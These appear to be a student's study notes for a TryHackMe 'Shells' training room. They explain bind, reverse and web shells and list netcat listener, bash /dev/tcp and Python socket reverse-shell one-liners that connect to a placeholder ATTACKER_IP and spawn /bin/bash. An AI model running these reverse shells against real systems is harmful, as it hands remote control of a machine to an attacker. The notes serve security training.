# Shells

> **Learning Path:** Cyber Security 101  
> **Platform:** TryHackMe  
> **Status:** ✅ Completed

---

# Overview

Shells provide a way to interact with a remote or local operating system. During penetration testing, understanding different shell types is essential for post-exploitation and system administration.

---

# Learning Objectives

- Understand what shells are.
- Differentiate between bind and reverse shells.
- Learn common shell commands.
- Explore shell stabilization techniques.

---

# Key Concepts

## Types of Shells

- Interactive Shell
- Reverse Shell
- Bind Shell
- Web Shell

---

## Reverse Shell

The target machine connects back to the attacker.

## Bind Shell

The target opens a listening port that the attacker connects to.

---

# Useful Commands

## Netcat Listener

```bash
nc -lvnp 4444
```

## Connect to a Bind Shell

```bash
nc TARGET_IP 4444
```

## Python HTTP Server

```bash
python3 -m http.server 8000
```

## Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## Python Reverse Shell

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# Practical Skills

- Understanding remote shell access
- Listening for incoming connections
- Stabilizing shells
- Managing remote sessions

---

# Key Takeaways

- Reverse shells are commonly used during penetration testing.
- Stabilizing a shell improves usability.
- Shell access depends on the permissions of the compromised user.

---

# Summary

This room introduced different shell types and demonstrated how shells are established and managed during authorized security assessments.
